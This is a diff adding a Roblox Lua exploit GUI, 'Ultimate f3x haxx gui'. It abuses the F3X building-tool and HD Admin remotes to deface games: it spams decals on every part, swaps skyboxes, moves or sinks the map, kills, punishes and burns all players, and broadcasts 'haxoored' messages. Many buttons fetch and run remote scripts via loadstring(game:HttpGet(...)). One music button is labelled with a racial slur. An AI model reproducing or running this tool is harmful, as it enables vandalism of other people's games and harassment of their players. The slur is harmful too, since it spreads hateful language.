@@ -1,0 +1,528 @@
+-- Ultimate f3x haxx gui | By roblox_user3177
+local P = game:GetService("Players")
+local U = game:GetService("UserInputService")
+local S = game:GetService("ReplicatedStorage")
+local LP = P.LocalPlayer
+local Y, YD, BLK = Color3.fromRGB(255, 230, 0), Color3.fromRGB(230, 200, 0), Color3.new()
+
+local function parent(gui)
+	gui.ResetOnSpawn = false
+	gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+	gui.DisplayOrder = 999999
+	gui.IgnoreGuiInset = true
+	local ok, hui = pcall(function() return gethui() end)
+	if ok and hui then
+		gui.Parent = hui
+		return
+	end
+	ok = pcall(function() gui.Parent = game:GetService("CoreGui") end)
+	if ok and gui.Parent then return end
+	pcall(function()
+		if syn and syn.protect_gui then syn.protect_gui(gui) end
+	end)
+	gui.Parent = LP:WaitForChild("PlayerGui")
+end
+
+local function hd(c)
+	pcall(function()
+		local x = S:FindFirstChild("HDAdminHDClient")
+		if x and x.Signals and x.Signals:FindFirstChild("RequestCommandSilent") then
+			x.Signals.RequestCommandSilent:InvokeServer(c)
+		end
+	end)
+end
+
+local function getT()
+	for _, v in pairs(LP:GetDescendants()) do
+		if v.Name == "SyncAPI" then return v.Parent end
+	end
+	for _, v in pairs(game:GetDescendants()) do
+		if v.Name == "SyncAPI" then return v.Parent end
+	end
+end
+
+local function F3X()
+	local t = getT()
+	if not t then return end
+	local r = t.SyncAPI.ServerEndpoint
+	local function _(a) r:InvokeServer(unpack(a)) end
+	local f = {}
+	f.CP = function(cf, p) _({[1] = "CreatePart", [2] = "Normal", [3] = cf, [4] = p or workspace}) end
+	f.SN = function(p, n) _({[1] = "SetName", [2] = {[1] = p}, [3] = n}) end
+	f.AM = function(p) _({[1] = "CreateMeshes", [2] = {{["Part"] = p}}}) end
+	f.SM = function(p, id) _({[1] = "SyncMesh", [2] = {{["Part"] = p, ["MeshId"] = "rbxassetid://" .. id}}}) end
+	f.ST = function(p, id) _({[1] = "SyncMesh", [2] = {{["Part"] = p, ["TextureId"] = "rbxassetid://" .. id}}}) end
+	f.MR = function(p, s) _({[1] = "SyncMesh", [2] = {{["Part"] = p, ["Scale"] = s}}}) end
+	f.SL = function(p, b) _({[1] = "SetLocked", [2] = {[1] = p}, [3] = b}) end
+	f.SA = function(b, p) _({[1] = "SyncAnchor", [2] = {{["Part"] = p, ["Anchored"] = b}}}) end
+	f.SD = function(p, s) _({[1] = "CreateTextures", [2] = {{["Part"] = p, ["Face"] = s, ["TextureType"] = "Decal"}}}) end
+	f.AD = function(p, id, s) _({[1] = "SyncTexture", [2] = {{["Part"] = p, ["Face"] = s, ["TextureType"] = "Decal", ["Texture"] = id == "" and "" or ("rbxassetid://" .. id)}}}) end
+	f.RS = function(p, s, cf) _({[1] = "SyncResize", [2] = {{["Part"] = p, ["CFrame"] = cf, ["Size"] = s}}}) end
+	f.MV = function(p, cf) _({[1] = "SyncMove", [2] = {{["Part"] = p, ["CFrame"] = cf}}}) end
+	f.TR = function(p, i) _({[1] = "SyncMaterial", [2] = {{["Part"] = p, ["Transparency"] = i}}}) end
+	f.CL = function(p, c) _({[1] = "SyncColor", [2] = {{["Part"] = p, ["Color"] = c, ["UnionColoring"] = false}}}) end
+	f.RM = function(p) _({[1] = "Remove", [2] = {[1] = p}}) end
+	f.Sky = function(id)
+		for _, v in pairs(workspace:GetChildren()) do
+			if v:IsA("BasePart") and (v.Name == "Sky" or v.Name:lower():find("sky")) then
+				pcall(function() f.RM(v) end)
+			end
+		end
+		task.wait(0.12)
+		local ch = LP.Character
+		if not ch then return end
+		local pos = ch.HumanoidRootPart.CFrame + Vector3.new(0, 6, 0)
+		f.CP(pos)
+		task.wait(0.12)
+		for _, v in pairs(workspace:GetChildren()) do
+			if v:IsA("BasePart") and (v.Position - pos.Position).Magnitude < 1.5 then
+				f.SN(v, "Sky") f.AM(v) f.SM(v, "111891702759441") f.ST(v, id)
+				f.MR(v, Vector3.new(1000, 1000, 1000)) f.SL(v, true) f.SA(true, v)
+				break
+			end
+		end
+	end
+	f.spam = function(id)
+		for _, v in pairs(workspace:GetDescendants()) do
+			if v:IsA("BasePart") then
+				task.spawn(function()
+					pcall(function()
+						f.SL(v, false)
+						for _, s in pairs({
+							Enum.NormalId.Front, Enum.NormalId.Back,
+							Enum.NormalId.Left, Enum.NormalId.Right,
+							Enum.NormalId.Top, Enum.NormalId.Bottom
+						}) do
+							f.SD(v, s) f.AD(v, id, s)
+						end
+					end)
+				end)
+			end
+		end
+	end
+	return f
+end
+
+local g = Instance.new("ScreenGui")
+g.Name = "UltimateF3X"
+g.Enabled = true
+parent(g)
+
+local m = Instance.new("Frame")
+m.Size = UDim2.new(0, 320, 0, 480)
+m.Position = UDim2.new(0.5, -160, 0.5, -240)
+m.BackgroundColor3 = Y
+m.BorderSizePixel = 3
+m.BorderColor3 = BLK
+m.Active = true
+m.Visible = true
+m.Parent = g
+
+local sc = Instance.new("ScrollingFrame")
+sc.Size = UDim2.new(1, 0, 1, 0)
+sc.BackgroundTransparency = 1
+sc.BorderSizePixel = 0
+sc.ScrollBarThickness = 6
+sc.CanvasSize = UDim2.new(0, 0, 0, 780)
+sc.Parent = m
+
+local function B(par, txt, sz, pos, cb)
+	local b = Instance.new("TextButton")
+	b.Size, b.Position = sz, pos
+	b.BackgroundColor3, b.BorderSizePixel, b.BorderColor3 = Y, 2, BLK
+	b.Text, b.TextColor3, b.Font, b.TextScaled = txt, BLK, Enum.Font.GothamBold, true
+	b.Parent = par
+	if cb then b.MouseButton1Click:Connect(function() pcall(cb) end) end
+	return b
+end
+
+local ti = Instance.new("TextLabel")
+ti.Size = UDim2.new(1, -8, 0, 32)
+ti.Position = UDim2.new(0, 4, 0, 4)
+ti.BackgroundColor3 = Y
+ti.BorderSizePixel = 2
+ti.BorderColor3 = BLK
+ti.Text = "Ultimate f3x haxx gui"
+ti.TextColor3 = BLK
+ti.Font = Enum.Font.GothamBold
+ti.TextScaled = true
+ti.Parent = sc
+
+local by = Instance.new("TextLabel")
+by.Size = UDim2.new(0, 90, 0, 14)
+by.Position = UDim2.new(1, -94, 0, 22)
+by.BackgroundTransparency = 1
+by.Text = "By roblox_user3177"
+by.TextColor3 = BLK
+by.TextSize = 10
+by.TextXAlignment = Enum.TextXAlignment.Right
+by.Parent = sc
+
+local ids = {"126743943740530", "95767058723166", "127729838362726", "83676516977681", "119950371481002"}
+local sel = ids[1]
+
+local prev = Instance.new("ImageLabel")
+prev.Size = UDim2.new(0, 100, 0, 100)
+prev.Position = UDim2.new(0, 8, 0, 42)
+prev.BackgroundColor3 = Y
+prev.BorderSizePixel = 2
+prev.BorderColor3 = BLK
+prev.Image = "rbxassetid://" .. sel
+prev.ScaleType = Enum.ScaleType.Fit
+prev.Parent = sc
+
+local idBox = Instance.new("TextBox")
+idBox.Size = UDim2.new(0, 100, 0, 22)
+idBox.Position = UDim2.new(0, 8, 0, 148)
+idBox.BackgroundColor3 = Y
+idBox.BorderSizePixel = 2
+idBox.BorderColor3 = BLK
+idBox.Text = sel
+idBox.TextColor3 = BLK
+idBox.TextScaled = true
+idBox.ClearTextOnFocus = false
+idBox.Parent = sc
+idBox.FocusLost:Connect(function()
+	if idBox.Text \~= "" then
+		sel = idBox.Text
+		prev.Image = "rbxassetid://" .. sel
+	end
+end)
+
+local th = Instance.new("Frame")
+th.Size = UDim2.new(0, 190, 0, 40)
+th.Position = UDim2.new(0, 118, 0, 48)
+th.BackgroundTransparency = 1
+th.Parent = sc
+for i, id in ipairs(ids) do
+	local t = Instance.new("ImageButton")
+	t.Size = UDim2.new(0, 34, 0, 34)
+	t.Position = UDim2.new(0, (i - 1) * 38, 0, 0)
+	t.BackgroundColor3 = YD
+	t.BorderSizePixel = 2
+	t.BorderColor3 = BLK
+	t.Image = "rbxassetid://" .. id
+	t.Parent = th
+	t.MouseButton1Click:Connect(function()
+		sel = id
+		idBox.Text = id
+		prev.Image = "rbxassetid://" .. id
+	end)
+end
+
+B(sc, "skybox", UDim2.new(0, 70, 0, 22), UDim2.new(0, 8, 0, 176), function()
+	local f = F3X()
+	if f then f.Sky(sel) end
+end)
+B(sc, "decal", UDim2.new(0, 70, 0, 22), UDim2.new(0, 82, 0, 176), function()
+	local f = F3X()
+	if f then f.spam(sel) end
+end)
+B(sc, "particles", UDim2.new(0, 70, 0, 22), UDim2.new(0, 8, 0, 200), function()
+	loadstring(game:HttpGet("https://scriptblox.com/raw/F3X-Building-Tools-MLG-Particle-F3X-By-zl0ew-233549"))()
+end)
+B(sc, "face", UDim2.new(0, 70, 0, 22), UDim2.new(0, 82, 0, 200), function()
+	local f = F3X()
+	if not f then return end
+	for _, plr in pairs(P:GetPlayers()) do
+		local h = plr.Character and plr.Character:FindFirstChild("Head")
+		if h then f.SD(h, Enum.NormalId.Front) f.AD(h, sel, Enum.NormalId.Front) end
+	end
+end)
+B(sc, "delete", UDim2.new(0, 70, 0, 22), UDim2.new(0, 156, 0, 176), function()
+	local f = F3X()
+	if not f then return end
+	for _, v in pairs(workspace:GetDescendants()) do
+		if v:IsA("BasePart") then
+			task.spawn(function()
+				pcall(function()
+					f.SL(v, false)
+					for _, s in pairs({
+						Enum.NormalId.Front, Enum.NormalId.Back,
+						Enum.NormalId.Left, Enum.NormalId.Right,
+						Enum.NormalId.Top, Enum.NormalId.Bottom
+					}) do
+						f.AD(v, "", s)
+					end
+				end)
+			end)
+		end
+	end
+end)
+B(sc, "f3x", UDim2.new(0, 70, 0, 22), UDim2.new(0, 156, 0, 200), function()
+	hd(";btools")
+end)
+
+local function spin()
+	local f = F3X()
+	if not f then return end
+	local chars = {}
+	for _, plr in pairs(P:GetPlayers()) do
+		if plr.Character then chars[plr.Character] = true end
+	end
+	local rot, n = CFrame.Angles(math.rad(15), 0, 0), 0
+	for _, v in pairs(workspace:GetDescendants()) do
+		if v:IsA("BasePart") and v.Parent then
+			local sk = false
+			for ch in pairs(chars) do
+				if v:IsDescendantOf(ch) then sk = true break end
+			end
+			if sk then continue end
+			local nm = v.Name:lower()
+			if nm:find("head") or nm:find("torso") or nm:find("arm") or nm:find("leg") or nm == "humanoidrootpart" then continue end
+			n = n + 1
+			task.spawn(function()
+				pcall(function()
+					f.SL(v, false)
+					task.wait(0.02)
+					f.MV(v, v.CFrame * rot)
+				end)
+			end)
+			if n % 25 == 0 then task.wait(0.04) end
+		end
+	end
+end
+
+local function textAll()
+	for _, p in pairs(workspace:GetDescendants()) do
+		if p:IsA("BasePart") then
+			pcall(function()
+				for _, face in pairs({
+					Enum.NormalId.Front, Enum.NormalId.Back,
+					Enum.NormalId.Left, Enum.NormalId.Right,
+					Enum.NormalId.Top, Enum.NormalId.Bottom
+				}) do
+					local n = "CT_" .. tostring(face)
+					local o = p:FindFirstChild(n)
+					if o then o:Destroy() end
+					local sg = Instance.new("SurfaceGui")
+					sg.Name, sg.Face, sg.AlwaysOnTop, sg.Parent = n, face, true, p
+					local tl = Instance.new("TextLabel", sg)
+					tl.Size, tl.BackgroundTransparency, tl.Text = UDim2.new(1, 0, 1, 0), 1, "roblox_user!"
+					tl.TextColor3, tl.TextScaled, tl.Font, tl.TextStrokeTransparency = Color3.fromRGB(255, 0, 0), true, Enum.Font.GothamBold, 0
+				end
+			end)
+		end
+	end
+end
+
+local function realm()
+	local f = F3X()
+	if not f then return end
+	local function find(pos)
+		task.wait(0.12)
+		for _, v in pairs(workspace:GetChildren()) do
+			if v:IsA("BasePart") and (v.Position - pos).Magnitude < 5 then return v end
+		end
+	end
+	hd(";punish all")
+	task.wait(0.12)
+	hd(";sm welcome to The realm of roblox_user!")
+	for _, v in pairs(workspace:GetDescendants()) do
+		if v:IsA("BasePart") and (v.Size.X >= 15 or v.Size.Z >= 15 or v.Name:lower():find("base")) then
+			pcall(function() f.MV(v, CFrame.new(0, -800, 0)) f.SA(true, v) end)
+		end
+	end
+	task.wait(0.25)
+	f.CP(CFrame.new(0, 5, 0))
+	local base = find(Vector3.new(0, 5, 0))
+	if base then
+		f.SN(base, "Baseplate")
+		f.RS(base, Vector3.new(300, 1, 300), CFrame.new())
+		f.CL(base, Color3.fromRGB(0, 180, 0))
+		f.SA(true, base)
+	end
+	for i, cf in ipairs({CFrame.new(0, 1.2, 0), CFrame.new(10, 1.2, 0), CFrame.new(-10, 1.2, 0)}) do
+		f.CP(cf)
+		local p = find(cf.Position)
+		if p then
+			f.SN(p, "Spawn" .. i)
+			f.RS(p, Vector3.new(6, 1, 6), cf)
+			f.TR(p, 1)
+			f.SA(true, p)
+			f.SD(p, Enum.NormalId.Top)
+			f.AD(p, "126743943740530", Enum.NormalId.Top)
+		end
+	end
+	task.wait(0.15)
+	hd(";unpunish all")
+	task.wait(10)
+	hd(";kill all")
+end
+
+local destOn, darkOn = false, false
+local function destroyer()
+	if destOn then destOn = false return end
+	destOn = true
+	hd(";music 16190761193") hd(";pitch 1") hd(";volume inf")
+	local f = F3X()
+	if f then
+		pcall(function() f.spam("127729838362726") end)
+		task.wait(0.15)
+		pcall(function() f.Sky("119950371481002") end)
+	end
+	hd(";fire all")
+	pcall(spin)
+	task.spawn(function()
+		while destOn do
+			hd(";sm ROBLOX_USER WAS DESTROYED THIS GAME LOLZ")
+			task.wait(3)
+		end
+	end)
+end
+
+local function darkMango()
+	if darkOn then return end
+	darkOn = true
+	hd(";music 76578817848504") hd(";pitch 1") hd(";volume inf")
+	local f = F3X()
+	if f then pcall(function() f.Sky("119950371481002") end) end
+	task.spawn(function()
+		while darkOn do
+			hd(";sm dark mango cartola_user psychology")
+			task.wait(1.5)
+		end
+	end)
+end
+
+local sh = Instance.new("TextLabel")
+sh.Size = UDim2.new(1, -16, 0, 28)
+sh.Position = UDim2.new(0, 8, 0, 236)
+sh.BackgroundColor3 = Y
+sh.BorderSizePixel = 2
+sh.BorderColor3 = BLK
+sh.Text = "scripts"
+sh.TextColor3 = BLK
+sh.Font = Enum.Font.GothamBold
+sh.TextScaled = true
+sh.Parent = sc
+
+local sf = Instance.new("Frame")
+sf.Size = UDim2.new(1, -16, 0, 280)
+sf.Position = UDim2.new(0, 8, 0, 268)
+sf.BackgroundColor3 = Y
+sf.BorderSizePixel = 2
+sf.BorderColor3 = BLK
+sf.Parent = sc
+
+local function sb(n, i, cb)
+	B(sf, n, UDim2.new(0, 140, 0, 24), UDim2.new(0, (i % 2) * 150 + 6, 0, math.floor(i / 2) * 28 + 6), cb)
+end
+
+sb("title all", 0, function() hd(";title all roblox_user WAS here") end)
+sb("title", 1, function() hd(";title roblox_user ROBLOX_USER") end)
+sb("fire all", 2, function() hd(";fire all") end)
+sb("unfire", 3, function() hd(";unfire all") end)
+sb("bring all", 4, function() hd(";bring all") end)
+sb("kill all", 5, function() hd(";kill all") end)
+sb("disco", 6, function() hd(";disco") end)
+sb("hint", 7, function() hd(";Sh this game haxoored by roblox_user") end)
+sb("message", 8, function() hd(";Sm this game haxoored by roblox_user l0l") end)
+sb("goner", 9, function()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-GONER-F3X-Script-R6-210773"))()
+end)
+sb("Obama rain", 10, function()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-obama-rain-f3x-29924"))()
+end)
+sb("char all", 11, function() hd(";char all roblox_user7133") end)
+sb("spin map", 12, function() spin() end)
+sb("Destroyer", 13, function() destroyer() end)
+sb("dark mango", 14, function() darkMango() end)
+sb("text all", 15, function() textAll() end)
+sb("r6", 16, function() hd(";r6") end)
+sb("mesh disco", 17, function()
+	loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-mesh-disco-f3x-235558"))()
+end)
+sb("realm", 18, function() realm() end)
+sb("Krusty", 19, function()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Krusty-Krab-F3X-MAP-149096"))()
+end)
+sb("Tubers", 20, function()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Tubers-Cave-F3X-MAP-204748"))()
+end)
+sb("FY Daycare", 21, function()
+	loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Forever-Young-Daycare-F3X-Incident-map-239726"))()
+end)
+sb("NDS", 22, function()
+	loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-natural-disaster-survivals-F3X-MAP-135568"))()
+end)
+sb("chicken arms", 23, function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/artzinn606-cpu/Chicken/main/game.Players.LocalPlayer"))()
+end)
+sb("Head shake", 24, function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/artzinn606-cpu/Head-sha/main/Head%20sha"))()
+end)
+sb("float pad", 25, function()
+	loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Floating-Pad-F3x-Made-by-me-111926"))()
+end)
+sb("speed 50", 26, function()
+	local h = (LP.Character or LP.CharacterAdded:Wait()):FindFirstChildOfClass("Humanoid")
+	if h then h.WalkSpeed = 50 end
+end)
+sb("speed normal", 27, function()
+	local h = (LP.Character or LP.CharacterAdded:Wait()):FindFirstChildOfClass("Humanoid")
+	if h then h.WalkSpeed = 16 end
+end)
+
+local mh = Instance.new("TextLabel")
+mh.Size = UDim2.new(1, -16, 0, 28)
+mh.Position = UDim2.new(0, 8, 0, 560)
+mh.BackgroundColor3 = Y
+mh.BorderSizePixel = 2
+mh.BorderColor3 = BLK
+mh.Text = "musics"
+mh.TextColor3 = BLK
+mh.Font = Enum.Font.GothamBold
+mh.TextScaled = true
+mh.Parent = sc
+
+local mf = Instance.new("Frame")
+mf.Size = UDim2.new(1, -16, 0, 160)
+mf.Position = UDim2.new(0, 8, 0, 592)
+mf.BackgroundColor3 = Y
+mf.BorderSizePixel = 2
+mf.BorderColor3 = BLK
+mf.Parent = sc
+
+local function mb(n, i, id, p)
+	B(mf, n, UDim2.new(0, 140, 0, 24), UDim2.new(0, (i % 2) * 150 + 6, 0, math.floor(i / 2) * 28 + 6), function()
+		hd(";music " .. id)
+		hd(";pitch " .. (p or 1))
+		hd(";volume inf")
+	end)
+end
+
+mb("dota", 0, "75817059227467")
+mb("c00lkidd", 1, "94635984925376")
+mb("music 3", 2, "125827224741373")
+mb("music 4", 3, "16190761193")
+mb("jumpstyle", 4, "76578817848504")
+mb("loud song", 5, "80053116409343")
+mb("iluminate", 6, "105355441763420", 0.1)
+mb("nigger", 7, "135787570731618", 2.9)
+mb("music ya", 8, "134426707262246")
+mb("Miguel", 9, "744917720742")
+
+local drag, st, po
+m.InputBegan:Connect(function(i)
+	if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
+		drag, st, po = true, i.Position, m.Position
+		i.Changed:Connect(function()
+			if i.UserInputState == Enum.UserInputState.End then drag = false end
+		end)
+	end
+end)
+U.InputChanged:Connect(function(i)
+	if drag and (i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch) then
+		local d = i.Position - st
+		m.Position = UDim2.new(po.X.Scale, po.X.Offset + d.X, po.Y.Scale, po.Y.Offset + d.Y)
+	end
+end)
+
+g.Enabled = true
+task.delay(0.3, function()
+	g.Enabled = true
+	if not g.Parent then parent(g) end
+end)
+
+print("GUI carregou")
